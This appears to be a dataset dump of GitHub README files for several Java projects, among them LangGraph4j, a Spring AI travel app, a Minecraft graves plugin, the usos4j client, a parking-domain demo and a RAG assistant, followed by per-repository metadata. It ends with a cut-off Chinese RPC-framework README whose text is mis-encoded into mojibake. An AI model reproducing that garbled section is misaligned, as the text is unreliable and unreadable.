### Adding LangGraph dependency 

#### Last stable version

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-beta5</version>
</dependency>
```

#### Development Version 

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

### Define the agent state

The main type of graph in `langgraph` is the `StatefulGraph`. This graph is parameterized by a state object that it passes around to each node. 
Each node then returns operations to update that state. These operations can either SET specific attributes on the state (e.g. overwrite the existing values) or ADD to the existing attribute. 
Whether to set or add is described in the state's schema provided to the graph. The schema is a Map of Channels, each Channel represent an attribute in the state. If an attribute is described with an `AppendeChannel` it will be a List and each element referring the attribute will be automaically added by graph during processing. The State must inherit from `AgentState` base class (that essentially is a `Map` wrapper).

```java
public class AgentState {

   public AgentState( Map<String,Object> initData ) { ... }
   
   public final java.util.Map<String,Object> data() { ... }

   public final <T> Optional<T> value(String key) { ... }
   public final <T> T value(String key, T defaultValue ) { ... }
   public final <T> T value(String key, Supplier<T>  defaultProvider ) { ... }
    

}
```

### Define the nodes

We now need to define a few different nodes in our graph. In `langgraph`, a node is an async/sync function that accept an `AgentState` as argument and returns a (partial) state update. There are two main nodes we need for this:

1. **The agent**: responsible for deciding what (if any) actions to take.
1. **A function to invoke tools**: if the agent decides to take an action, this node will then execute that action.

```java

/**
 * Represents an asynchronous node action that operates on an agent state and returns state update.
 *
 * @param <S> the type of the agent state
 */
@FunctionalInterface
public interface AsyncNodeAction<S extends AgentState> extends Function<S, CompletableFuture<Map<String, Object>>> {

    CompletableFuture<Map<String, Object>> apply(S t);

    /**
     * Creates an asynchronous node action from a synchronous node action.
     */
    static <S extends AgentState> AsyncNodeAction<S> node_async(NodeAction<S> syncAction) { ... }
}

```

### Define Edges

We will also need to define some edges. Some of these edges may be conditional. The reason they are conditional is that based on the output of a node, one of several paths may be taken. The path that is taken is not known until that node is run (the LLM decides).

1. **Conditional Edge**: after the agent is called, we should either:
    * If the agent said to take an action, then the function to invoke tools should be called
    * If the agent said that it was finished, then it should finish
1. **Normal Edge**: after the tools are invoked, it should always go back to the agent to decide what to do next

```java

/**
 * Represents an asynchronous edge action that operates on an agent state and returns a new route.
 *
 * @param <S> the type of the agent state
 */
public interface AsyncEdgeAction<S extends AgentState> extends Function<S, CompletableFuture<String>> {

    CompletableFuture<String> apply(S t);

    /**
     * Creates an asynchronous edge action from a synchronous edge action.
     */
    static <S extends AgentState> AsyncEdgeAction<S> edge_async(EdgeAction<S> syncAction ) { ... }
}
```

### Define the graph

We can now put it all together and define the graph! (see example below)

## Integrate with LangChain4j

Like default use case proposed in [LangGraph blog][langgraph.blog], We have ported [AgentExecutor] implementation from [langchain] using LangGraph4j. In the [agents](agents) project's module, you can the complete working code with tests. Feel free to checkout and use it as a reference.
Below you can find a piece of code of the `AgentExecutor` to give you an idea of how is has built in langgraph style.


```java

public static class State implements AgentState {

    // the state's (partial) schema 
    static Map<String, Channel<?>> SCHEMA = mapOf(
        ""intermediate_steps"", AppenderChannel.<IntermediateStep>of(ArrayList::new)
    );

    public State(Map<String, Object> initData) {
        super(initData);
    }

    Optional<String> input() {
        return value(""input"");
    }
    Optional<AgentOutcome> agentOutcome() {
        return value(""agent_outcome"");
    }
    List<IntermediateStep> intermediateSteps() {
        return this.<List<IntermediateStep>>value(""intermediate_steps"").orElseGet(emptyList());
    }
   
}

var toolInfoList = ToolInfo.fromList( objectsWithTools );

final List<ToolSpecification> toolSpecifications = toolInfoList.stream()
        .map(ToolInfo::specification)
        .toList();

var agentRunnable = Agent.builder()
                        .chatLanguageModel(chatLanguageModel)
                        .tools( toolSpecifications )
                        .build();

// Fluent Interface
var app = new StateGraph<>(State.SCHEMA,State::new)
                .addEdge(START,""agent"")
                .addNode( ""agent"", node_async( state ->
                    runAgent(agentRunnable, state))
                )
                .addNode( ""action"", node_async( state ->
                    executeTools(toolInfoList, state))
                )
                .addConditionalEdges(
                        ""agent"",
                        edge_async( state -> {
                            if (state.agentOutcome().map(AgentOutcome::finish).isPresent()) {
                                return ""end"";
                            }
                            return ""continue"";
                        }),
                        mapOf(""continue"", ""action"", ""end"", END)
                )
                .addEdge(""action"", ""agent"")
                .compile();

return  app.stream( inputs );

```


# Playground Webapp 

It is available an **embed playground webapp** able to run a Langgraph4j workflow in visual way. 

## Maven

```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-server-jetty</artifactId>
    <version>1.0-beta5</version>
<dependency>
```

## Sample

### Code
```java
StateGraph<AgentState> workflow = new StateGraph<>( AgentState::new );

// define your workflow   

...

var saver = new MemorySaver();
// connect playgroud webapp to workflow
var server = LangGraphStreamingServer.builder()
                                      .port(8080)
                                      .title(""LANGGRAPH4j - TEST"")
                                      .stateGraph( workflow )
                                      .checkpointSaver(saver)
                                      .addInputStringArg(""input"")
                                      .build();
// start playground
server.start().join();

```
### Demo
![result](assets/playground-demo.gif)

# References

* [LangGraph - LangChain Blog][langgraph.blog]
* [AI Agent in Java with LangGraph4j - Bartolomeo Blog][article01]
* [Java Async Generator, a Java version of Javascript async generator][java-async-generator]

[CompletableFuture]: https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/CompletableFuture.html
[article01]: https://bsorrentino.github.io/bsorrentino/ai/2024/05/20/langgraph-for-java.html
[langgraph.blog]: https://blog.langchain.dev/langgraph/
[langchain4j]: https://github.com/langchain4j/langchain4j
[langchain.ai]: https://github.com/langchain-ai
[langchain]: https://github.com/langchain-ai/langchain/
[langgraph]: https://github.com/langchain-ai/langgraph
[langchain.agents]: https://python.langchain.com/docs/modules/agents/
[AgentExecutor]: https://github.com/langchain-ai/langchain/blob/master/libs/langchain/langchain/agents/agent.py
[PlantUML]: https://plantuml.com
[java-async-generator]: https://github.com/bsorrentino/java-async-generator
[Mermaid]: https://mermaid.js.org

[javadocs]: https://bsorrentino.github.io/langgraph4j/apidocs/index.html
[snapshots]: https://oss.sonatype.org/content/repositories/snapshots/org/bsc/langgraph4j/langgraph4j-jdk8/1.0-SNAPSHOT
[releases]: https://central.sonatype.com/search?q=a%3Alanggraph4j-parent
",5,10,3,3.0,"['langgraph', 'java', 'feature', 'sample', 'how', 'to', 's', 'release', 'quick', 'start', 'add', 'langgraph', 'dependency', 'last', 'stable', 'version', 'development', 'version', 'define', 'agent', 'state', 'define', 'node', 'define', 'edge', 'define', 'graph', 'integrate', 'playground', 'webapp', 'maven', 'sample', 'code', 'demo', 'reference']","['define', 'langgraph', 'sample', 'version', 'java']",7.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:exec-maven-plugin,org.projectlombok:lombok-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,6.0,1.0
alina-yur/native-spring-ai,main,"# Native Spring AI

This is a travel recommendation service built with Spring AI, OpeAI, and GraalVM. The base is a regular Spring app, and the integration with OpenAI is implemented in `RecommendationService`. Note that the app is using `OPENAI_API_KEY`.

## Build a native app with GraalVM:

```shell
mvn -Pnative native:compile
```

## Start the app and navigate to the travel request form:

```shell
./target/travelapp
http://localhost:8080/
```

After submitting your preferences, you'll get a generated recommendation â€“ for example:

```
Here is your travel recommendation!ğŸ’â€â™€ï¸

Destination suggestion: Zurich, Switzerland Zurich is not only known for its stunning views and picturesque landscapes, but it also offers a vibrant nightlife scene with plenty of cocktail bars and lounges to explore. As an adventurous traveler, you can immerse yourself in the city's energetic atmosphere and try out unique and creative cocktails at trendy bars. During the day, you can also take advantage of Zurich's outdoor activities such as hiking in the nearby mountains or cruising on Lake Zurich. And for the ultimate adventure, you can even try paragliding or skydiving for a truly unforgettable experience.

Enjoy your trip!ğŸ‘‹
```",0,0,1,0.0,"['native', 'spring', 'ai', 'build', 'native', 'app', 'graalvm', 'start', 'app', 'navigate', 'travel', 'request', 'form']","['native', 'app', 'spring', 'ai', 'build']",1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
AvarionMC/graves,master,"![Graves logo](images/graves_logo.png)

# Acknowledgement

This plugin was made by Ranull, and imported via his [GitLab repository](https://gitlab.com/ranull/minecraft/graves). As
it wasn't updated in nearly 2 years, and no official source for a minecraft 1.20.2 and higher version, I decided to fork
it and keep it alive (ğŸ˜ pun intended!).

Original code was released under GPLv3. So everything will be kept under the same license here.

# What is it?

The **ULTIMATE** full-featured lightweight death chest plugin / player grave plugin! Every feature you could ever need
and more! While still being lightweight and efficient.

## Top Features

* Customizable
* Schematics
* Economy
* Regions
* Placeholders
* Protection
* Zombies
* Corpses
* Models
* Obituary
* Compass
* Head Drops
* Holograms
* Particles
* Tokens
* Blacklisting
* Reload Safe

## Supports

* 1.18.\*, 1.19.\*, 1.20.\*, 1.21.\*
* Spigot, Paper, Purpur, Airplane, Pufferfish, Tuinity, CraftBukkit, CatServer, Mohist, Magma, MultiPaper
* GeyserMC (Bedrock Players)
* Forge/Bukkit Hybrid servers (Mohist, Magma, CatServer)

## Integrations

* Vault (Economy)
* WorldEdit (Schematics)
* WorldGuard (Flags)
* PlaceholderAPI (Placeholders)
* FurnitureLib/DiceFurniture (Furniture)
* FurnitureEngine (Furniture)
* ItemsAdder (Furniture/Blocks)
* Oraxen (Furniture/Blocks)
* ChestSort (Sorting Grave)
* ProtectionLib (Protected Region Detection)
* PlayerNPC (Corpses)

* Towny
* ItemBridge
* MineDown
* MiniMessage

## Screenshots

![Screenshot 1](images/screenshot_1.png)
![Screenshot 2](images/screenshot_2.png)

## Videos

[![Graves plugin](https://img.youtube.com/vi/mq8aoZE6Jl0/0.jpg)](https://www.youtube.com/watch?v=mq8aoZE6Jl0)

**Video by:** _ServerMiner_

## Commands

| Command                                           | what does it do?             |
|---------------------------------------------------|------------------------------|
| **/graves**                                       | Player graves                |
| **/graves help**                                  | Plugin info                  |
| **/graves list** _{player}_                       | List another players graves. |
| **/graves givetoken** _{player} {token} {amount}_ | Give grave token (OP)        |
| **/graves dump**                                  | Dump server information (OP) |
| **/graves debug** _{level}_                       | Change debug level (OP)      |
| **/graves reload**                                | Reload command (OP)          |

## Permissions

    graves.place (Default)
    graves.open (Default)
    graves.break (Default)
    graves.teleport (Default)
    graves.experience (Default)
    graves.autoloot (Default)
    graves.gui (Default)
    graves.gui.other (OP)
    graves.givetoken (OP)
    graves.bypass (OP)
    graves.reload (OP)

## Bug Reports

If you find bugs please report them [here](https://github.com/svaningelgem/graves/issues).

## Usage

![Server usage](https://bstats.org/signatures/bukkit/AvarionGraves.svg)

## Links

- **Spigot**: https://www.spigotmc.org/resources/graves.116202/
- **bStats**: https://bstats.org/plugin/bukkit/AvarionGraves/21607
- **GitHub**: https://github.com/AvarionMC/graves
",6,5,4,32.0,"['acknowledgement', 'what', 'it', 'top', 'feature', 'support', 'integration', 'screenshots', 'video', 'command', 'permission', 'bug', 'report', 'usage', 'link']","['acknowledgement', 'what', 'it', 'top', 'feature']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
WMS-DEV/usos4j,main,"# usos4j - Java client for USOS API

âœ¨ using USOS API just became fun âœ¨

## Features

- **Simplified Communication**: Easily interact with the USOS API without dealing with the complexities of low-level HTTP requests.
- **Detailed Documentation**: Comprehensive documentation, with practical demos, to guide developers on how to use the library effectively.
- **Authentication Handling**: Streamlined handling of OAuth and access tokens for secure communication with the USOS API.
- **Modular Design**: Organized into modules for easy integration and maintenance.
- **Well tested**: Includes integration and architecture tests to ensure the reliability and stability of the library.
- **Open for extension**: The library includes constructs, that make it easy to integrate additional modules, without relying on the library development itself, see generic endpoint demo below

## Getting Started

### Note: JDK 17+ is required

The library is available on maven-central, use this code snippet to use it!
```XML
<dependency>
    <groupId>pl.wmsdev</groupId>
    <artifactId>usos4j</artifactId>
    <version>1.1.4</version>
</dependency>
```

Consider checking out our demos on how to use usos4j on basic scenarios:

- [Console application with code-based authentication](https://github.com/WMS-DEV/usos4j/tree/master/demo)
- [Web application with oAuth authentication](https://github.com/WMS-DEV/usos4j/tree/master/spring-demo)
- [Full Spring Security integration - log in to your aplication through USOS](https://github.com/WMS-DEV/usos4j/tree/master/spring-security-demo)

We also offer you an access to a generic endpoint, which can make it easier for you to access USOS as you wish, providing the authentication support, here is an example on how you can use it:
```java
var usos = Usos.builder()......build();
var serverApi = usos.getServerApi();
var usosApiRefModuleResponse = serverApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as an unauthenticated API client
var userApi = usos.getUserApi();
var userApiRefModuleResponse = userApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as a user
```

## Integrated modules:
The library supports
- apiref
- apisrv
- calendar
- cards
- courses
- credits
- fac
- feedback
- grades
- groups
- mailing
- news
- payments
- phones
- photos
- plctests
- progs
- registrations
- terms
- theses
- timetable
- rest of the modules thanks to generic endpoint implementation

We decided to integrate the most interesting endpoints from the user perspective. We are very open for contributions integrating more modules, but it's not so easy, as we are not in possesion of any USOS testing enviroment, meaning we can only integrate modules, that the universities of contributors use.

## Documentation

- Checkout our contribution guidelines
- To fully understand the concepts in the library, consider visiting debug module, where you will be able to find integration tests

## System configuration

You can find available websites for generating USOSAPI keys in [the installations list](https://apps.usos.edu.pl/developers/api/definitions/installations/) 

Usos integration tests and demos, are based on this system enviroments configuration:

- usos_baseurl - base url of USOSAPI that you would like to use. For Politechnika WrocÅ‚awska it would be https://apps.usos.pwr.edu.pl/
- usos_consumerKey - Consumer key. You can generate it on a proper USOS APPS website. For Politechnika WrocÅ‚awska it would be https://apps.usos.pwr.edu.pl/developers/
- usos_consumerSecret - Consumer secret, also generated from the website above
- usos_login - login to your USOS account, if you wish to use HeadlessUsosProvider (automatic possesion of authorization tokens)
- usos_password - password to your USOS account, as above

## Contributing

We welcome contributions from the community! If you would like to contribute to the USOS API Communication Library, please refer to the [Contributors Guidelines](git/usos4j-prod/CONTRIBUTORS.md) for instructions on how to get started.

## Support

If you encounter any issues or have any questions about usos4j, please feel free to [open an issue](../../issues) on GitHub. We are here to help!

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

We would like to thank all the contributors who have helped make this project possible. Especially the WMS creators of the library:
- [@gniadeck](https://github.com/gniadeck)
- [@MDybek](https://github.com/MDybek)
- [@Foxyg3n](https://github.com/Foxyg3n)
- [@pszumanski](https://github.com/pszumanski)
- [@michalK00](https://github.com/michalK00)

---

Thank you for choosing usos4j. We hope it simplifies your interaction with the USOS API and enhances your development experience! ğŸš€
Feel free to share any amazing project you create with it B)
",6,1,1,15.0,"['java', 'client', 'usos', 'api', 'feature', 'get', 'start', 'note', 'jdk', 'require', 'integrate', 'module', 'documentation', 'system', 'configuration', 'contribute', 'support', 'license', 'acknowledgment']","['java', 'client', 'usos', 'api', 'feature']",5.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.projectlombok:lombok-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0
cezarysanecki/parking-domain,master,"[![Build](https://github.com/cezarysanecki/parking-domain/actions/workflows/maven.yml/badge.svg)](https://github.com/cezarysanecki/parking-domain/actions/workflows/maven.yml)
[![codecov](https://codecov.io/gh/cezarysanecki/parking-domain/graph/badge.svg?token=IWUFNCKYCN)](https://codecov.io/gh/cezarysanecki/parking-domain)

![Parking domain](./docs/public/logo.png)

# Parking Domain - [contest 100 commits](https://100commitow.pl/)

> Studying the business domain before its implementation is the best decision you can make.

The Parking Domain project aims to demonstrate the evolution from a rudimentary and limited model to a more
sophisticated solution. I'm committed to undertaking this challenge and seeing if I can successfully navigate it. ğŸ˜

This is just experiment which serves solely for **educational purposes**. While I will define the MVP and other
necessary aspects, it's important to note that this domain is not the ultimate goal itself.

**Letâ€™s dive into the code and see where it takes us!**

## Used frameworks/libraries/tools

Main:

- [Java 21](https://openjdk.org/projects/jdk/21/)
- [Maven](https://maven.apache.org/)
- [Spring Boot 3](https://spring.io/projects/spring-boot)
    - [Web](https://docs.spring.io/spring-boot/docs/current/reference/html/web.html)
    - [JPA](https://spring.io/projects/spring-data-jpa)
- [Quartz](https://www.quartz-scheduler.org/)
- [Lombok](https://projectlombok.org/)
- [JOOQ](https://www.jooq.org/)
- [Postgres](https://www.postgresql.org/)
- [Liquibase](https://www.liquibase.com/)

Tests:

- [Testcontainers](https://testcontainers.com/)
- [Spock](https://spockframework.org/)

Tools:

- [Bruno](https://www.usebruno.com/)

## Lessons learnt

ğŸ‘‰ _Ideal code does not exist_
ğŸ‘‰ _Make analysis before coding_
ğŸ‘‰ _Tests are great, but they slow you down if you're prototyping_
ğŸ‘‰ _Duplication of chosen logic is sometimes good f.ex. validation of exceeding parking spot space (stable requirement)_

## FAQ

### How to run app locally?

The best way to run app locally is to use below command.

```shell
mvn spring-boot:run -Dspring-boot.run.profiles=local
```

App will be running with in-memory databases and with initial data in them.

### How to run app with Postgres database?

First of all we will need [Docker](https://www.docker.com/) to run Postgres database.

```shell
docker run -d -p 5432:5432 -e POSTGRES_PASSWORD={secret} -e POSTGRES_USER={username} postgres:16.4
```

Then we are able to run ""production-ready"" version of app.

```shell
mvn spring-boot:run
```

Because of lacking GUI in this project I prepared [Bruno](https://www.usebruno.com/) files to call APIs
(Open Source substitution for Postman) to interact with application.

![Example of Bruno usage](docs/public/bruno_usage.png)

### Is it production-ready?

Could be... I wrote some tests to check if application is working. Also, I use it with simulation of time passing.
It works, but there could be some corner cases which could cause unexpected problems.

### Why parking domain?

Don't know. I experimented with implementing the voting and vaccination domains, deliberately writing ugly code for
educational purposes. However, the outcome left me feeling discouraged. I've shared this experience
on [my blog \[PL\]](https://cezarysanecki.pl/2024/02/13/prezentacja-prostej-domeny/). I'm hopeful that coding an anemic
model for the parking domain won't result in the same challenges as my previous attempts. Interestingly, I came across
this domain in one of the [DevMentors YouTube videos](https://www.youtube.com/@DevMentorsPL/videos), and I thought, ""Why
not give it a try?""

### Why Java and Spring?

Because it's my ""native"" background, and my goal isn't to learn a new language. I aim to learn how to model a domain
with existing legacy code and explore tools from the JVM ecosystem (but not exclusively).

## MVP

- [ ] ~~3-layer app with anemic model (without tests)~~
- [ ] Added business logic
    - [X] Occupation
    - [X] Requests
    - [X] Reservations
- [X] Refactoring multiple times to find ""the best"" solution
- [X] Looking for deep model (modules)
    - [X] Do simple Event Storming session
- [X] Add other types of requirements
    - [X] Simple fee logic
    - [X] Cleaning
    - [X] Notifications about reservations
- [X] Add JOOQ
    - [X] Based on Postgres
- [X] Write everything using in-mem database

## Business context

This software is being developed for a client who owns a parking facility near a shopping center and offices. Presently,
anyone can park there for a small fee. However, this setup is frustrating for both the business and its clients. The
business earns only a modest amount, while clients struggle to find parking due to constant occupations.

The business aims to address this situation by implementing software that enables users to reserve parking spots for
specific times of the day. Additionally, the software will optimize parking utilization by allowing multiple small
vehicles to occupy a single parking spot. Further requirements are outlined below.

### Parking

- Parking is available **since 5am until 1am**
    - Clients can only occupy parking spots **until 12pm**
    - The last hour is reserved for reminders about releasing parking spots and towing
- There is technical break **since 1am until 5am**
- Parking spots have their own identity
- Parking spots are assigned to groups: BRONZE, SILVER, GOLD (attractiveness spot)
    - [WARNING] Not used for business logic, just markers
- Parking spots can be occupied (for now) by: cars, motorcycles and scooters
- Every parking spot has its own capacity (for now it is 4 units)
- On parking spot can park different combinations of vehicle types f.ex.
    - One vehicle (1 x 4)
    - Two motorcycles (2 x 2)
    - One motorcycles and two scooters (1 x 2 + 2 x 1)
    - Four scooters (4 x 1)
- One occupant can occupy only one spot on parking spot (whole or part of it)

### Requesting parking spot

- There is limit for requests according to client type:
    - individual - only one
    - business - at most twenty
- Client can request any parking spot by its id pointing how many units are required for him
- Request is not valid reservation
- Request can be made, cancelled until they become valid (become reservations) at 1am
- Requests can be made for
    - first part of day (5:00-17:00)
    - second part of day (18:00-24:00)

### Reservations

- Reservation can be used to park on parking spot
- If a client fails to fulfill a reservation he will be charged for not used reservation
- Clients who are on reserved parking spot will be notified that they should free parking spot

### Cleaning parking spots

- Parking spots can be cleaned during technical break
- Cleaning service is called when 10 parking spots are considered dirty
    - It means 20 releases

### Fee

- [WARNING] There should be price list
- Fee for not using reservation is 50$

## Analysis

### Timeline model [PL] - Overall view

![Graphical representation of business](./docs/public/timeline_model.png)

## Educational goals

I would like to learn the following technologies/tools. I need to consider which of them to use
in the current project during the MVP phase.

- [X] Implementation
  - [X] Unit/Integration tests (Protect business logic) + TestContainers if needed
  - [X] Split domains/hexagonal architecture
- [X] JOOQ
- [ ] Save form vs Save state per field
- [ ] Security (OAuth, SSL, CORS etc.)
- [ ] Event Sourcing
- [ ] Microservices
    - [ ] Service discovery
    - [ ] Circuit breaker
    - [ ] Tenants?
- [ ] Functional approach
- [ ] Kubernetes/Docker
- [ ] Kotlin
- [ ] Kafka
- [ ] Read Model/CQRS
- [ ] Slack notifications
- [ ] Micronaut/Quarkus
- [ ] HotWire
- [ ] Observability
- [ ] Profiling
- [ ] Documentation
- [ ] Bi-temporal event
- [ ] jMeter

## Scratches

![Scratch for parking](./docs/public/discovery_scratch.png)

## Inspirations

- [DevMentors YouTube video](https://www.youtube.com/@DevMentorsPL/videos)
- [Library by example](https://github.com/ddd-by-examples/library)
",0,1,3,169.0,"['park', 'domain', 'contest', 'commits', 'http', 'use', 'lesson', 'learn', 'faq', 'how', 'run', 'app', 'locally', 'how', 'run', 'app', 'postgres', 'database', 'be', 'why', 'park', 'domain', 'why', 'java', 'spring', 'mvp', 'business', 'context', 'park', 'request', 'park', 'spot', 'reservation', 'clean', 'park', 'spot', 'fee', 'analysis', 'timeline', 'model', 'pl', 'overall', 'view', 'educational', 'goal', 'scratch', 'inspiration']","['park', 'domain', 'how', 'run', 'app']",1.0,"[maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.gmavenplus:gmavenplus-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.jacoco:jacoco-maven-plugin,org.jooq:jooq-codegen-maven,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Fernanda-Kipper/ai-assistant-java,main,"# AI Assistant APP

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring](https://img.shields.io/badge/spring-%236DB33F.svg?style=for-the-badge&logo=spring&logoColor=white)
[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)

This project is an API built using **Java, Java Spring, Langchain4j and LM Studio.**

The app was developed for my [Youtube Tutorial](https://www.youtube.com/live/Vo7OnKULYUg?si=xkKK2eVBFQNJSih4), to demonstrate how to create a simple AI Assistant using RAG technique.

## Table of Contents

- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Contributing](#contributing)

## Installation

1. Clone the repository:

```bash
git clone https://github.com/Fernanda-Kipper/ai-assistant-java
```

2. Install dependencies with Maven

## Usage

1. Start the application with Maven
2. The API will be accessible at http://localhost:8080
3. Install [LM Studio](https://lmstudio.ai/)
4. Download model Google's Gemma 2B Instruct
5. Start LM Server

<img src="".github/lm-studio-print.png""/>

## API Endpoints
The API provides the following endpoints:

**GET USERS**
```markdown
POST /api/chat - Retrieve a list of all users.
```
```json
{
  ""message"": ""List 4 movies of the catalog that have Category Romance""
}
```
```json
{
  ""response"": ""The movies that have Category Romance are: - La La Land - Titanic""
}
```

## RAG Knowledge Base
The Knowledge base used for retrieve context to RAG technique is the movies.txt located inside `src/main/resources` path

```txt
Movie Catalog
---

Movie: The Godfather
Year: 1972
Director: Francis Ford Coppola
Actors: Marlon Brando, Al Pacino, James Caan
Category: Action
Synopsis: The saga of the Corleone family in the Italian mafia of New York.
---

Movie: Fight Club
Year: 1999
Director: David Fincher
Actors: Brad Pitt, Edward Norton, Helena Bonham Carter
Category: Action
Synopsis: A disillusioned white-collar worker forms an underground fight club.
---

Movie: Forrest Gump
Year: 1994
Director: Robert Zemeckis
Actors: Tom Hanks, Robin Wright, Gary Sinise
Category: Comedy
Synopsis: The story of a man with low IQ who witnessed or influenced significant events of the 20th century in America, maintaining hope and love for his childhood passion, Jenny.
---

Movie: Titanic
Year: 1997
Director: James Cameron
Actors: Leonardo DiCaprio, Kate Winslet, Billy Zane
Category: Romance
Synopsis: A poor artist and a rich young woman meet and fall in love on the fateful voyage of the RMS Titanic.
---

Movie: La La Land
Year: 2016
Director: Damien Chazelle
Actors: Ryan Gosling, Emma Stone, John Legend
Category: Romance
Synopsis: A jazz musician and an aspiring actress fall in love while pursuing their dreams in a city known for crushing hopes and breaking hearts.
---

```

## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request to the repository.

When contributing to this project, please follow the existing code style, [commit conventions](https://www.conventionalcommits.org/en/v1.0.0/), and submit your changes in a separate branch.




",0,0,1,0.0,"['ai', 'assistant', 'app', 'table', 'content', 'installation', 'usage', 'api', 'endpoint', 'rag', 'knowledge', 'base', 'contribute']","['ai', 'assistant', 'app', 'table', 'content']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
zhushimmer/enhance-rpc-zt,main,"# description
ä¸€æ¬¾è‡ªç ”RPCæ¡†æ¶ï¼Œé€šè¿‡å¯¹åŸå§‹Dubboçš„ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ä¸€äº›æ€§èƒ½é—®é¢˜ï¼Œä¹‹ååšå‡ºçš„ä¿®æ”¹ä¸æ€§èƒ½æå‡ï¼Œæœ¬èº«ä¸€æ¬¾è½¯ä»¶ä¸å¯èƒ½æ˜¯å®Œç¾æ— ç¼ºï¼Œå¯¹äºè½¯ä»¶çš„è‡ªç ”æå‡æ€§èƒ½çš„åŒæ—¶ï¼Œå¯¹åº•å±‚æ¡†æ¶çš„äº†è§£ï¼Œæœ‰åŠ©äºè‡ªå·±æ›´å¥½ï¼Œæ›´é«˜æ•ˆçš„ä½¿ç”¨
# Usage and Enhance
## 1 Future change CompletaleFutue
Future:è¡¨ç¤ºå¼‚æ­¥è®¡ç®—ç»“æœçš„æ¥å£

  æˆ‘æœ‰ä¸€ä¸ªä»»åŠ¡ï¼Œæäº¤ç»™äº† Future æ¥å¤„ç†ã€‚ä»»åŠ¡æ‰§è¡ŒæœŸé—´æˆ‘è‡ªå·±å¯ä»¥å»åšä»»ä½•æƒ³åšçš„äº‹æƒ…ã€‚å¹¶ä¸”ï¼Œåœ¨è¿™æœŸé—´æˆ‘è¿˜å¯ä»¥å–æ¶ˆä»»åŠ¡ä»¥åŠè·å–ä»»åŠ¡çš„æ‰§è¡ŒçŠ¶æ€ã€‚ä¸€æ®µæ—¶é—´ä¹‹åï¼Œæˆ‘å°±å¯ä»¥ Future é‚£é‡Œç›´æ¥å–å‡ºä»»åŠ¡æ‰§è¡Œç»“æœã€‚
  
  Future åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€äº›å±€é™æ€§æ¯”å¦‚ä¸æ”¯æŒå¼‚æ­¥ä»»åŠ¡çš„ç¼–æ’ç»„åˆã€è·å–è®¡ç®—ç»“æœçš„ get() æ–¹æ³•ä¸ºé˜»å¡è°ƒç”¨ã€‚
  
CompletaleFutue: åŸºäºäº‹ä»¶é©±åŠ¨çš„å¼‚æ­¥å›è°ƒç±»

  CompletableFuture é™¤äº†æä¾›äº†æ›´ä¸ºå¥½ç”¨å’Œå¼ºå¤§çš„ Future ç‰¹æ€§ä¹‹å¤–ï¼Œè¿˜æä¾›äº†å‡½æ•°å¼ç¼–ç¨‹ã€å¼‚æ­¥ä»»åŠ¡ç¼–æ’ç»„åˆï¼ˆå¯ä»¥å°†å¤šä¸ªå¼‚æ­¥ä»»åŠ¡ä¸²è”èµ·æ¥ï¼Œç»„æˆä¸€ä¸ªå®Œæ•´çš„é“¾å¼è°ƒç”¨ï¼‰ç­‰èƒ½åŠ›ã€‚


### é—®é¢˜å‘ç°ï¼š


å¦‚æœä¸€ä¸ªæ–¹æ³•é‡Œé¢æ¶‰åŠåˆ°äº† 3 ä¸ª rpc è°ƒç”¨ï¼Œå‡è®¾æ¯ä¸ª rpc è°ƒç”¨éƒ½éœ€è¦ 10msï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•æ€»è€—æ—¶å°†ä¸ä½äº 30msã€‚

```JAVA
public boolean provingOrder(long userId, long itemId, double rate) {
    
    // éªŒè¯ç”¨æˆ·èƒ½å¦äº«å—è¿™ä¸€å¾…é‡ï¼ŒRPCè°ƒç”¨
    boolean provingDiscount = provingService.proving(userId, itemId, rate);
    
    if(!provingDiscount) {
        // è¯¥ç”¨æˆ·æ— æ³•äº«å—è¿™ä¸€æŠ˜æ‰£
        return false;
    }
    
    // è·å–è¯å“å•ä»·ï¼ŒRPCè°ƒç”¨
    double itemPrice = storeService.getPrice(itemId);
